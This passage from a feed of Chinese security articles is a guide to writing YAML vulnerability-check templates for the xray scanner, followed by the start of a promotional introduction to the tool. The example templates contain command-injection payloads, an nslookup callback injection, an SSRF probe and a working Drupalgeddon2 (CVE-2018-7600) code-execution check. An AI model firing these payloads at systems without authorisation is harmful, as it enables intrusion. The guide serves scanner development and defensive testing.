POC。&lt;/p&gt;&lt;h2&gt;POC结构&lt;/h2&gt;&lt;p&gt;一个最基础的POC如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;name: poc-yaml-example-com
rules:
  - method: GET
    path: &amp;#34;/&amp;#34;
    expression: |
      status==200 &amp;amp;&amp;amp; body.bcontains(b&amp;#39;Example Domain&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;整个POC是一个键值对，其包含3个键：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;name: string&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;rules: []Rule&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;detail: map[string]string&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;name是POC的名字，我们使用一个英文字母、数字和短横线进行表示，如&lt;code&gt;poc-yaml-thinkphp523-rce&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;rules是一个由规则（Rule）组成的列表，后面会描述如何编写Rule，并将其组成rules。&lt;/p&gt;&lt;p&gt;detail是一个键值对，内部存储需要返回给xray引擎的内容，如果无需返回内容，可以忽略。&lt;/p&gt;&lt;h2&gt;如何编写Rule&lt;/h2&gt;&lt;p&gt;Rule就是我们POC的灵魂，在YAML中一个Rule是一个键值对，其包含如下键：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;method: string&lt;/code&gt; 请求方法&lt;/li&gt;&lt;li&gt;&lt;code&gt;path: string&lt;/code&gt; 请求的完整Path，包括querystring等&lt;/li&gt;&lt;li&gt;&lt;code&gt;headers: map[string]string&lt;/code&gt; 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中&lt;/li&gt;&lt;li&gt;&lt;code&gt;body: string&lt;/code&gt; 请求的Body&lt;/li&gt;&lt;li&gt;&lt;code&gt;follow_redirects: bool&lt;/code&gt; 是否允许跟随300跳转&lt;/li&gt;&lt;li&gt;&lt;code&gt;expression: string&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;search: string&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;根据这些键的作用，我们将其分为三类：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;method&lt;/code&gt;、&lt;code&gt;path&lt;/code&gt;、&lt;code&gt;headers&lt;/code&gt;、&lt;code&gt;body&lt;/code&gt;、&lt;code&gt;follow_redirects&lt;/code&gt;的作用是生成检测漏洞的数据包&lt;/li&gt;&lt;li&gt;&lt;code&gt;expression&lt;/code&gt;的作用是判断该条Rule的结果&lt;/li&gt;&lt;li&gt;&lt;code&gt;search&lt;/code&gt;的作用是从返回包中提取信息&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;xray对于POC扫描的流程如下：&lt;/p&gt;&lt;p&gt;POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的&lt;code&gt;method&lt;/code&gt;、&lt;code&gt;path&lt;/code&gt;、&lt;code&gt;headers&lt;/code&gt;、&lt;code&gt;body&lt;/code&gt;、&lt;code&gt;follow_redirects&lt;/code&gt;键值，替换原始数据包中的对应信息。&lt;/p&gt;&lt;p&gt;替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。&lt;/p&gt;&lt;h3&gt;如何编写expression表达式&lt;/h3&gt;&lt;p&gt;如果说Rule是一个POC的灵魂，那么expression表达式就是Rule的灵魂。&lt;/p&gt;&lt;p&gt;正如spring使用SpEL表达式，struts2使用OGNL表达式，xray使用了编译性语言Golang，所以为了实现动态执行一些规则，我们使用了Common Expression Language (CEL)表达式。&lt;/p&gt;&lt;p&gt;关于CEL表达式项目的详细信息，可以参考&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/google/cel-spec&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/google/cel-s&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pec&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;项目。如果你只是编写一些简单的规则，只需要阅读本文档的即可。&lt;/p&gt;&lt;p&gt;我们从上述示例中的表达式开始说起：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;status==200 &amp;amp;&amp;amp; body.bcontains(b&amp;#39;Example Domain&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CEL表达式通熟易懂，非常类似于一个Python表达式。上述表达式的意思是：&lt;b&gt;返回包status等于200，且body中包含内容“Example Domain”&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;expression表达式上下文包含的变量暂时只有如下三个，之后会逐渐进行扩展：&lt;/p&gt;&lt;p&gt;&lt;b&gt;变量名类型说明&lt;/b&gt;&lt;code&gt;statusint&lt;/code&gt;返回包的status code&lt;code&gt;body[]byte&lt;/code&gt;返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法&lt;code&gt;content_typestring&lt;/code&gt;返回包的content-type头的值&lt;code&gt;headersmap[string]string&lt;/code&gt;返回包的HTTP头，是一个键值对（均为小写），我们可以通过&lt;code&gt;headers[&amp;#39;server&amp;#39;]&lt;/code&gt;来获取值。如果键不存在，则获取到的值是空字符串&lt;/p&gt;&lt;p&gt;expression表达式上下文包含所有CEL文档中支持的函数，同时还包含xray引擎中自定义的函数，常用的函数如下：&lt;/p&gt;&lt;p&gt;&lt;b&gt;函数名函数原型说明&lt;/b&gt;&lt;code&gt;containsfunc (s1 string) contains(s2 string) bool&lt;/code&gt;判断s1是否包含s2，返回bool类型结果。&lt;code&gt;bcontainsfunc (b1 bytes) bcontains(b2 bytes) bool&lt;/code&gt;判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找。&lt;code&gt;matchesfunc (s1 string) matches(s2 string) bool&lt;/code&gt;使用正则表达式s1来匹配s2，返回bool类型匹配结果。&lt;code&gt;bmatchesfunc (s1 string) bmatches(b1 bytes) bool&lt;/code&gt;使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）。&lt;code&gt;startsWithfunc (s1 string) startsWith(s2 string) bool&lt;/code&gt;判断s1是否由s2开头&lt;code&gt;endsWithfunc (s1 string) endsWith(s2 string) bool&lt;/code&gt;判断s1是否由s2结尾&lt;/p&gt;&lt;p&gt;值得注意的是，类似于python，CEL中的字符串可以有转义和前缀，如：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;&amp;#39;\r\n&amp;#39;&lt;/code&gt; 表示换行&lt;/li&gt;&lt;li&gt;&lt;code&gt;r&amp;#39;\r\n&amp;#39;&lt;/code&gt; 不表示换行，仅仅表示这4个字符。在编写正则时很有意义。&lt;/li&gt;&lt;li&gt;&lt;code&gt;b&amp;#39;test&amp;#39;&lt;/code&gt; 一个字节流（bytes），在golang中即为&lt;code&gt;[]byte&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;用一些简单的例子来覆盖大部分我们可能用到的表达式：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;body.bcontains(b&amp;#39;test&amp;#39;)&lt;/code&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;返回包body包含test，因为body是一个bytes类型的变量，所以我们需要使用bcontains方法，且其参数也是bytes&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;code&gt;content_type.contains(&amp;#39;application/octet-stream&amp;#39;) &amp;amp;&amp;amp; body.bcontains(b&amp;#39;\x00\x01\x02&amp;#39;)&lt;/code&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;返回包的content-type包含“application/octet-stream”，且body中包含0x000102这段二进制串&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;code&gt;content_type.contains(&amp;#39;zip&amp;#39;) &amp;amp;&amp;amp; r&amp;#39;^PK\x03\x04&amp;#39;.bmatches(body)&lt;/code&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type包含关键字“zip”，且body匹配上正则r’^PK\x03\x04’（就是zip的文件头）。因为startsWith方法只支持字符串的判断，所以这里没有使用。&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;code&gt;status &amp;gt;= 300 &amp;amp;&amp;amp; status &amp;lt; 400&lt;/code&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;返回包的status code在300~400之间&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;&lt;code&gt;(status &amp;gt;= 500 &amp;amp;&amp;amp; status != 502) || r&amp;#39;&amp;lt;input value=&amp;#34;(.+?)&amp;#34;&amp;#39;.bmatches(body)&lt;/code&gt;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;返回包status code大于等于500且不等于502，或者Body包含表单&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;expression表达式返回的必须是一个bool类型的结果，这个结果作为整个Rule的值，而rules由多个Rule组成。值为true的Rule，如果后面还有其他Rule，则继续执行后续Rule，如果后续没有其他Rule，则表示该POC的结果是true；如果一个Rule的expression返回false，则不再执行后续Rule，也表示本POC的返回结果是false。&lt;/p&gt;&lt;p&gt;也就是说，一个POC的rules中，最后一个Rule的值，决定是否存在漏洞。&lt;/p&gt;&lt;h3&gt;search的作用&lt;/h3&gt;&lt;p&gt;一个Rule中，可以支持使用search来查找返回包中的内容；当然，如果不需要查找内容，则可以忽略search。&lt;/p&gt;&lt;p&gt;search是一个字符串类型的正则表达式，我们用一个简单的案例来进行说明。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;name: poc-yaml-example-com
rules:
  - method: GET
    path: &amp;#34;/update&amp;#34;
    expression: &amp;#34;true&amp;#34;
    search: |
      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrftoken&amp;#34; value=&amp;#34;(.+?)&amp;#34;
  - method: POST
    path: &amp;#34;/update&amp;#34;
    body: |
      id=&amp;#39;;echo(md5(123));//&amp;amp;csrftoken={{1}}
    expression: |
      status == 200 &amp;amp;&amp;amp; body.bcontains(b&amp;#39;202cb962ac59075b964b07152d234b70&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;目标漏洞是一个简单的代码执行，但因为是POST请求，所以需要先获取当前用户的CSRF Token。所以，我们的POC分为两个Rule，第一个Rule发送GET请求，并使用search指定的正则提取返回包中的csrftoken表单值，此时expression直接执行表达式&lt;code&gt;true&lt;/code&gt;，表示第一条规则一定执行成功；第二个Rule发送POST请求，此时，我们可以在path、body、headers中使用前一个规则search的结果，如&lt;code&gt;{{0}}&lt;/code&gt;、&lt;code&gt;{{1}}&lt;/code&gt;等。&lt;/p&gt;&lt;p&gt;&lt;code&gt;{{&lt;/code&gt;、&lt;code&gt;}}&lt;/code&gt;中包含的数字是正则的提取的group数组，0表示匹配的整个内容，1、2、3…n表示匹配到的第n个group。我这里取到的value值是第1个结果，所以使用&lt;code&gt;{{1}}&lt;/code&gt;。如果正则没有匹配成功，或者n不在group范围内，这里不会进行替换。&lt;/p&gt;&lt;h3&gt;如何编写借助反连平台的POC&lt;/h3&gt;&lt;p&gt;反连平台是测试一些无回显漏洞的方法，如SSRF、命令执行等，下面介绍一下如何在编写POC的时候，借助反连平台来探测漏洞。&lt;/p&gt;&lt;p&gt;正如上文中我们介绍过的，我们可以在path、headers、body中注入一些变量，与反连平台相关的变量如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;{{reverse_url}}&lt;/code&gt; 反连平台的url&lt;/li&gt;&lt;li&gt;&lt;code&gt;{{reverse_domain}}&lt;/code&gt; 反连平台的域名&lt;/li&gt;&lt;li&gt;&lt;code&gt;{{reverse_ip}}&lt;/code&gt; 反连平台的ip地址&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在测试SSRF漏洞的过程中，我们可以直接在请求中注入&lt;code&gt;{{reverse_url}}&lt;/code&gt;，这个变量就会被替换成反连平台的URL发送：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;path: /request?url={{reverse_url}}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时，如果目标网站存在SSRF漏洞，就会访问我们反连平台的URL，进而我们接收到信息，检测出漏洞。&lt;/p&gt;&lt;p&gt;那么，有时候目标网站无法发送HTTP请求，我们亦可用DNS请求来判断漏洞。如，目标网站存在命令执行漏洞，我们可以通过执行&lt;code&gt;nslookup&lt;/code&gt;命令来请求我们反连平台的DNS服务器，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;path: /execute
body: |
  param=`nslookup%20{{reverse_domain}}%20{{reverse_ip}}`&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时我们使用&lt;code&gt;{{reverse_domain}}&lt;/code&gt;和&lt;code&gt;{{reverse_ip}}&lt;/code&gt;变量，前者会被替换成反连平台的域名，后者替换成反连平台IP，此时nslookup会向&lt;code&gt;{{reverse_ip}}&lt;/code&gt;发送一个包含&lt;code&gt;{{reverse_domain}}&lt;/code&gt;的DNS请求，此时反连平台即将收到消息，并成功记录下漏洞。&lt;/p&gt;&lt;p&gt;接着，我们需要在表达式expression中，来判断反连平台的状态，此时我们使用上下文中的&lt;code&gt;waitReverse&lt;/code&gt;函数：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;func waitReverse(timeout int) bool&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;waitReverse&lt;/code&gt;将会等待&lt;code&gt;timeout&lt;/code&gt;秒，在这个时间内，如果反连平台收到消息，则返回true，否则一直阻塞，直到超时时间，如果超时时间到后仍然未收到消息，则该函数返回false。&lt;/p&gt;&lt;p&gt;所以，一个完整的SSRF POC示例如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;name: example-ssrf-poc
rules:
  - method: GET
    path: /request?url={{reverse_url}}
    expression: |
      status == 200 &amp;amp;&amp;amp; waitReverse(5)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果5秒内，反连平台收到符合要求的请求，则&lt;code&gt;waitReverse(5)&lt;/code&gt;返回true，整个expression返回true，漏洞存在；如果status不是200或5秒内反连平台没有收到请求，则&lt;code&gt;waitReverse(5)&lt;/code&gt;返回false，漏洞不存在。&lt;/p&gt;&lt;h2&gt;POC编写辅助工具&lt;/h2&gt;&lt;p&gt;当然，对于YAML格式本身不熟悉的同学，我们也提供了如下一些开发辅助工具：&lt;/p&gt;&lt;h3&gt;在线编写POC&lt;/h3&gt;&lt;p&gt;地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//phith0n.github.io/xray-poc-generation/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;phith0n.github.io/xray-&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;poc-generation/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;编写后点击生成然后复制到本地测试即可&lt;/p&gt;&lt;h3&gt;使用VSCode编写POC&lt;/h3&gt;&lt;p&gt;使用 VSCode，进行一些配置后可以提供一些智能提示，方便编写 POC。&lt;/p&gt;&lt;p&gt;首先安装 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//marketplace.visualstudio.com/items%3FitemName%3Dredhat.vscode-yaml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;marketplace.visualstudio.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/items?itemName=redhat.vscode-yaml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; 插件，然后在 settings 中确认 Extensions - YAML 中相关的开关已经打开。然后点击 &lt;code&gt;Edit in settings.json&lt;/code&gt;，将 json 内容修改为&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;{
    &amp;#34;yaml.schemas&amp;#34;: {
        &amp;#34;https://chaitin.github.io/xray/assets/yaml-poc-schema.json&amp;#34;: &amp;#34;poc-yaml-*.yml&amp;#34;
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样创建 &lt;code&gt;poc-yaml-&lt;/code&gt; 开头的 &lt;code&gt;yml&lt;/code&gt; 为拓展名的文件的时候，就可以自动提示了。&lt;/p&gt;&lt;p&gt;注意，由于插件的 bug，除了第一行以外，其他的内容无法直接提示，需要使用快捷键让 VSCode 显示提示，一般是 &lt;code&gt;ctrl&lt;/code&gt; + &lt;code&gt;Space&lt;/code&gt;。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1010&quot; data-rawheight=&quot;496&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1010&quot; data-original=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1010&quot; data-rawheight=&quot;496&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1010&quot; data-original=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ce3300be73efbb33b320fd69e6fc4889_b.gif&quot;/&gt;&lt;/figure&gt;&lt;h3&gt;jetbrains 系列 IDE&lt;/h3&gt;&lt;p&gt;下载文件： &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/assets/yaml-poc-schema.json&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chaitin.github.io/xray/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;assets/yaml-poc-schema.json&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;配置见图&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dcee35a3d0a2e94b527b76e6e510a4ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1012&quot; data-rawheight=&quot;698&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1012&quot; data-original=&quot;https://pic3.zhimg.com/v2-dcee35a3d0a2e94b527b76e6e510a4ae_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dcee35a3d0a2e94b527b76e6e510a4ae_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1012&quot; data-rawheight=&quot;698&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1012&quot; data-original=&quot;https://pic3.zhimg.com/v2-dcee35a3d0a2e94b527b76e6e510a4ae_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-dcee35a3d0a2e94b527b76e6e510a4ae_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;一个示例POC：《Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600）》&lt;/h2&gt;&lt;p&gt;这里给出一个样例POC：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;name: poc-yaml-drupal-drupalgeddon2-rce
rules:
  - method: POST
    path: &amp;#34;/?q=user/password&amp;amp;name[%23post_render][]=printf&amp;amp;name[%23type]=markup&amp;amp;name[%23markup]=test%25%25test&amp;#34;
    headers:
      User-Agent: &amp;#34;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&amp;#34;
    body: |
      form_id=user_pass&amp;amp;_triggering_element_name=name&amp;amp;_triggering_element_value=&amp;amp;opz=E-mail+new+Password
    search: |
      name=&amp;#34;form_build_id&amp;#34;\s+value=&amp;#34;(.+?)&amp;#34;
    expression: |
      status==200
  - method: POST
    path: &amp;#34;/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}&amp;#34;
    headers:
      User-Agent: &amp;#34;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&amp;#34;
    body: |
      form_build_id={{1}}
    expression: |
      body.bcontains(b&amp;#39;test%test&amp;#39;)
detail:
  drupal_version: 7&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该POC分为两个Rule，第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID；第二个数据包，将前面提取的缓存ID&lt;code&gt;{{1}}&lt;/code&gt;，拼接到body中，触发代码执行漏洞，并使用&lt;code&gt;body.bcontains(b&amp;#39;test%test&amp;#39;)&lt;/code&gt;来判断是否成功执行。&lt;/p&gt;&lt;p&gt;关于这个漏洞的原理，可以参考这篇文章：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//paper.seebug.org/578/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;paper.seebug.org/578/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;。&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-08-15-78334648</guid>
<pubDate>Thu, 15 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>长亭xray：一款自动化Web漏洞扫描神器（免费社区版）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-08-14-78132359.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78132359&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ddc5f75db95d20352c6acaae44c43b80_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;xray 简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/chaitin/xray&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;xray&lt;/a&gt; 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows / macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。&lt;/p&gt;&lt;a class=&quot;video-box&quot; href=&quot;https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1145001352550928384&quot; target=&quot;_blank&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-name=&quot;&quot; data-poster=&quot;https://pic2.zhimg.com/v2-7603c3aae7a4289d82a4feb1bf38b6e7.jpeg&quot; data-lens-id=&quot;1145001352550928384&quot;&gt;&lt;img class=&quot;thumbnail&quot; src=&quot;https://pic2.zhimg.com/v2-7603c3aae7a4289d82a4feb1bf38b6e7.jpeg&quot;/&gt;&lt;span class=&quot;content&quot;&gt;&lt;span class=&quot;title&quot;&gt;&lt;span class=&quot;z-ico-extern-gray&quot;&gt;&lt;/span&gt;&lt;span class=&quot;z-ico-extern-blue&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;url&quot;&gt;&lt;span class=&quot;z-ico-video&quot;&gt;&lt;/span&gt;https://www.zhihu.com/video/1145001352550928384&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;特色&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;使用 go 语言编写，跨平台、纯异步、无阻塞，并发能力强，扫描速度刚刚的&lt;/li&gt;&lt;li&gt;提供多种使用方式，调用姿势方便，输入输出非常标准化，极具可集成性&lt;/li&gt;&lt;li&gt;使用 YAML 配置文件非常方便地定义 POC，可以快速扩展扫描能力&lt;/li&gt;&lt;li&gt;全程使用无害 POC 进行探测，在确保能发现漏洞的基础上不会给业务带来严重影响，非常适用于企业内部安全建设&lt;/li&gt;&lt;li&gt;命令行式的免费被动扫描工具，不多见&lt;/li&gt;&lt;li&gt;自备盲打平台，可检测需要反连才能触发的漏洞，如：存储型 XSS、无回显的 SSRF、XXE、命令注入等&lt;/li&gt;&lt;li&gt;更新速度快，用着不爽可以在 github 提需求，很快就能解决（我试过了，是真的）&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;适用人群&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;白帽子。挖 SRC 必备，打开浏览器挂上代理，然后上网冲浪等漏洞就对了，还不够的话就把代理给你爸妈、给你妹子、给你家猫都挂上&lt;/li&gt;&lt;li&gt;甲方安全建设者。工具在手，天下我有，细粒度配置，高精度扫描，可作为定期巡检、常规扫描的辅助神器&lt;/li&gt;&lt;li&gt;乙方工具开发者。在编写渗透框架或者漏洞扫描框架时，作为扫描探针进行集成，简直是大平台中的小尖刀&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;快速使用&lt;/h2&gt;&lt;h3&gt;扫描一个站点&lt;/h3&gt;&lt;p&gt;最简单的方式是直接调用，扫描一个指定的站点，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --basic-crawler http://example.com/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以 &lt;code&gt;alias xray=&amp;#34;/path/xray webscan --basic-crawler&amp;#34;&lt;/code&gt;&lt;/blockquote&gt;&lt;h3&gt;指定扫描输出&lt;/h3&gt;&lt;p&gt;不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --url http://example.com/ --json-output report.json&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不同参数对应不同的输出方式：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;无参数：输出到控制台的标准输出&lt;/li&gt;&lt;li&gt;&lt;code&gt;--text-output&lt;/code&gt;：输出到文本文件中&lt;/li&gt;&lt;li&gt;&lt;code&gt;--json-output&lt;/code&gt;：输出到 JSON 文件中&lt;/li&gt;&lt;li&gt;&lt;code&gt;--html-output&lt;/code&gt;：输出到 HTML 文件中&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;基于代理的被动扫描&lt;/h3&gt;&lt;p&gt;xray 可以通过类似 Burp 的方式启动，利用 HTTP 代理来抓包扫描，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --listen 127.0.0.1:7777&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果运行没报任何错就可以设置浏览器 HTTP 代理为 &lt;code&gt;127.0.0.1:7777&lt;/code&gt; 了，关于如何设置浏览器代理，请打开百度搜索 “浏览器设置代理”。&lt;/p&gt;&lt;p&gt;代理设置 OK 以后就可以启动代理扫描了，这时候我们打来浏览器尽情冲浪吧，理论上我们的鼠标点到哪 xray 就能扫到哪。&lt;/p&gt;&lt;p&gt;需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的 &lt;code&gt;ca.crt&lt;/code&gt; 证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;➜   ls
